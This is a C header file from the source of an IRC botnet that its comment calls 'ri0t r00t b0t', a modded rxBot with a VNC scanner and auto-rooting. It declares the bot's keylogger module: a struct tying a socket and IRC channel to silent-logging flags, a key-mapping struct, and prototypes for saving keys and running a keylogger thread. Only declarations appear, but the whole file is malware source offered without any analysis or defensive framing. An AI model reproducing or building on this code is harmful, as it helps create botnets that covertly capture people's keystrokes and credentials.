/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_KEYLOG
typedef struct KEYLOG 
{	
	SOCKET sock;
	int threadnum;
	char chan[MAXCHANLEN];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} KEYLOG;

typedef struct KEYS
{
	int inputL;
	char outputL[7];
	char outputH[7];

} KEYS;

int SaveKeys(char *key, KEYLOG keylog);
DWORD WINAPI KeyLoggerThread(LPVOID param);
#endif
